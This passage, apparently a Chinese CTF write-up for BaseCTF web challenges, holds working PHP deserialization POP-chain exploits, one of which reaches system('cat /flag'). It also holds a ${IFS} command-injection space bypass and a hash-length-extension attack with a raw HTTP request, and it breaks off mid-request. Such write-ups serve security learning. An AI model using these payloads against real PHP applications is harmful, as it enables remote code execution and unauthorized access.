class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"getflag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$re</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$web</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$misc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token variable">$misc</span><span class="token punctuation">;</span><span class="token variable">$re</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token variable">$pwn</span><span class="token punctuation">;</span><span class="token variable">$web</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$web</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终构造：<code>O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;s:4:&quot;gods&quot;;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</code></p><h2 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h2><p>绕过空格：<code>cmd=cat$&#123;IFS&#125;/flag</code></p><h2 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$Sink</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Shark</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Sink</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Nature</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token variable">$Sea</span><span class="token punctuation">;</span><span class="token variable">$Sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token variable">$Shark</span><span class="token punctuation">;</span><span class="token variable">$Shark</span><span class="token operator">-></span><span class="token function">setPrivateVar</span><span class="token punctuation">(</span><span class="token variable">$Sink</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$Nature</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发过去的序列化内容要在私有类的类名和属性名前加<code>\x00</code>，最终发送<code>nature=O:6:&quot;Nature&quot;:1:&#123;s:3:&quot;sea&quot;;O:3:&quot;Sea&quot;:1:&#123;s:6:&quot;animal&quot;;O:5:&quot;Shark&quot;:1:&#123;s:11:&quot;%00Shark%00word&quot;;O:4:&quot;Sink&quot;:1:&#123;s:9:&quot;%00Sink%00cmd&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;&#125;</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code> 使用: 私有的类的名称 (考虑到继承的情况) 和字段名组合 <code>\x00类名称\x00字段名</code></li><li><code>protected</code> 使用: <code>*</code> 和字段名组合 <code>\x00*\x00字段名</code></li></ul><h2 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h2><p>从网页利用正则获取算数式然后post加answer参数发过去，需要开启session cookie</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">extract_and_calculate</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> <span class="token string">r'(\d+)\s*([+\-*/÷×]+)\s*(\d+)'</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> expression<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        num1<span class="token punctuation">,</span> operator<span class="token punctuation">,</span> num2 <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>        operator <span class="token operator">=</span> operator<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'÷'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'×'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        python_expression <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num1<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>operator<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>python_expression<span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error in calculation: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No valid expression found."</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">'http://challenge.basectf.fun:29707'</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>extract_and_calculate<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span>    post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'answer'</span><span class="token punctuation">:</span> res    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="所以你说你懂md5？"><a href="#所以你说你懂md5？" class="headerlink" title="所以你说你懂md5？"></a>所以你说你懂md5？</h2><p>利用<code>hash-ext-attack</code>工具进行哈希长度扩展</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 hash_ext_attack<span class="token punctuation">.</span>py<span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">46.493</span> <span class="token operator">|</span> DEBUG    <span class="token operator">|</span> common<span class="token punctuation">.</span>md5_manual<span class="token punctuation">:</span>__init__<span class="token punctuation">:</span><span class="token number">17</span> <span class="token operator">-</span> init<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>请输入已知明文：请输入已知<span class="token builtin">hash</span>： 82cb3db8069266aecdc0d3cdabb4b460 请输入扩展字符<span class="token punctuation">:</span> admin请输入密钥长度：<span class="token number">96</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">65</span> <span class="token operator">-</span> 已知明文：<span class="token string">b''</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">66</span> <span class="token operator">-</span> 已知<span class="token builtin">hash</span>：<span class="token string">b'82cb3db8069266aecdc0d3cdabb4b460'</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">68</span> <span class="token operator">-</span> 新明文：<span class="token string">b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00admin'</span><span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">69</span> <span class="token operator">-</span> 新明文<span class="token punctuation">(</span>url编码<span class="token punctuation">)</span>：<span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>00admin<span class="token number">2024</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">10</span> <span class="token number">20</span><span class="token punctuation">:</span><span class="token number">53</span><span class="token punctuation">:</span><span class="token number">52.093</span> <span class="token operator">|</span> INFO     <span class="token operator">|</span> common<span class="token punctuation">.</span>HashExtAttack<span class="token punctuation">:</span>run<span class="token punctuation">:</span><span class="token number">71</span> <span class="token operator">-</span> 新<span class="token builtin">hash</span><span class="token punctuation">:</span>e7e7b8375abc6096501a68bbd0e3f662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送http内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> challenge<span class="token punctuation">.</span>basectf<span class="token punctuation">.</span>fun<span class="token punctuation">:</span><span class="token number">49521</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.159</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Cookie<span class="token punctuation">:</span>PHPSESSID<span class="token operator">=</span>1gtcjs8kgqmltafgpn6cncugfvAccept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> brAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedConnection<span class="token punctuation">:</span> closeContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">522</span>apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token 